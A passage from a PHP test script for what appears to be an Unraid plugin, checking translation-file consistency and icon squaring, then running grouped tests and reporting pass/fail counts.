                same("$where/$code: keys English lacks", [], array_values(array_diff(array_keys($l), array_keys($e))));
                if (in_array($code, $complete, true)) {
                    same("$where/$code: English keys missing", [], array_values(array_diff(array_keys($e), array_keys($l))));
                }
            }
            $shape = $placeholders = [];
            foreach ($l as $k => $v) {
                if (!array_key_exists($k, $e)) {
                    continue;
                }
                if (is_array($e[$k]) ? !langPluralOk($v) : !is_string($v)) {
                    $shape[] = $k;
                }
                if (langPlaceholders($v) !== langPlaceholders($e[$k])) {
                    $placeholders[] = $k;
                }
            }
            same("$where/$code: plurals and texts shaped like English", [], $shape);
            same("$where/$code: placeholders like English", [], $placeholders);
        }
    }
    foreach (glob("$pub/lang/*.json") ?: [] as $file) {
        $meta = json_decode((string) @file_get_contents($file), true)['_meta'] ?? [];
        check(basename($file) . ': _meta has name and locale', is_string($meta['name'] ?? null) && $meta['name'] !== ''
            && is_string($meta['locale'] ?? null) && $meta['locale'] !== '');
    }

    // texts asked for by the pages: T('key') in a desk, t('key') / Office.t('key') anywhere
    foreach (glob("$pub/desks/*/desk.js") ?: [] as $file) {
        $desk = basename(dirname($file));
        $js = (string) file_get_contents($file);
        preg_match_all("/(?<![.\\w])T\\(\\s*'([a-z0-9_.]+)'\\s*[,)]/", $js, $m);
        foreach (array_unique($m[1]) as $k) {
            check("$desk/desk.js asks for $desk.$k", isset($en["$desk.$k"]));
        }
        preg_match_all("/\\bOffice\\.t\\(\\s*'([a-z0-9_.]+)'\\s*[,)]/i", $js, $m);
        foreach (array_unique($m[1]) as $k) {
            check("$desk/desk.js asks for $k", isset($en[$k]));
        }
    }
    $core = preg_replace(['#/\*.*?\*/#s', '#^\s*//.*$#m'], '', (string) file_get_contents("$pub/assets/core.js"));   // not in comments
    preg_match_all("/(?<![.\\w])t\\(\\s*'([a-z0-9_.]+)'\\s*[,)]/", $core, $m);
    foreach (array_unique($m[1]) as $k) {
        check("core.js asks for $k", isset($en[$k]));
    }

    // the caretaker shows every finding as <desk>.check.<id> (and _how, if any)
    $sources = [];
    foreach (glob(OFFICE_DIR . '/agent/desks/*.php') ?: [] as $file) {
        $sources[basename($file, '.php')][] = $file;
    }
    $sources['snapshot'][] = OFFICE_DIR . '/agent/lib/snapshotplans.php';
    foreach ($sources as $desk => $files) {
        foreach ($files as $file) {
            preg_match_all("/\\bfinding\\(\\s*'([a-z0-9_]+)'/", (string) file_get_contents($file), $m);
            foreach (array_unique($m[1]) as $id) {
                check("$desk: text for check '$id'", isset($en["$desk.check.$id"]));
            }
        }
    }

    // every Problem key has a text, at a desk or in the office
    $errors = [];
    foreach ($en as $k => $_) {
        if (preg_match('/(?:^|\.)errors\.([a-z0-9_]+)$/', $k, $x)) {
            $errors[$x[1]] = true;
        }
    }
    foreach (array_merge(glob(OFFICE_DIR . '/agent/*.php') ?: [], glob(OFFICE_DIR . '/agent/lib/*.php') ?: [], glob(OFFICE_DIR . '/agent/desks/*.php') ?: [],
                         glob(OFFICE_DIR . '/src/*.php') ?: []) as $file) {
        preg_match_all("/new (?:Problem|OfficeProblem)\\(\\s*'([a-z0-9_]+)'/", (string) file_get_contents($file), $m);
        foreach (array_unique($m[1]) as $key) {
            check(basename($file) . ": text for error '$key'", isset($errors[$key]));
        }
    }
}

/** Ms. Dustdevil squares pictures that aren't square (Unraid would squeeze them) */
function testIconSquare(): void
{
    if (!function_exists('imagecreatetruecolor')) {
        return;
    }
    $tmp = sys_get_temp_dir() . '/office-tests-square-' . getmypid();
    @mkdir($tmp, 0700, true);
    foreach (['wide' => [1123, 512], 'tall' => [100, 300], 'square' => [200, 200], 'small' => [60, 30]] as $n => [$w, $h]) {
        $im = imagecreatetruecolor($w, $h);
        imagepng($im, "$tmp/$n.png");
        $sq = clIconSquare("$tmp/$n.png");
        if ($n === 'square') {
            same('icon square: a square picture stays', null, $sq);
            continue;
        }
        $size = is_string($sq) ? getimagesizefromstring($sq) : null;
        $want = min(CL_SQUARE_SIDE, max($w, $h));
        same("icon square: $n becomes {$want}x{$want}", [$want, $want], $size ? [$size[0], $size[1]] : null);
    }
    same('icon square: not a picture', null, clIconSquare(__FILE__));
    array_map('unlink', glob("$tmp/*") ?: []);
    @rmdir($tmp);
}

// ===================================================================== run

$parts = ['logic' => ['testCron', 'testRetention', 'testSnapshotNames', 'testEmby', 'testOfficeCron', 'testMenuName', 'testEstimates', 'testBackupFirstUpload', 'testNotify', 'testCaretakerAcks',
                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupSkip', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testAdvisor', 'testAdvisorInstall', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testJobGuard', 'testComposeBuilds', 'testExclusive'],
          'hardening' => ['testSafeWrites', 'testTrashManifest', 'testEmbyPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets'],
          'strings' => ['testStrings']];
$only = $argv[1] ?? '';
foreach ($parts as $name => $fns) {
    if ($only === '' || $only === $name) {
        foreach ($fns as $t) {
            $t();
        }
    }
}
$fail = $GLOBALS['results']['fail'];
foreach ($fail as $f) {
    echo "FAIL  $f\n";
}
printf("%d passed, %d failed\n", $GLOBALS['results']['pass'], count($fail));
exit($fail ? 1 : 0);
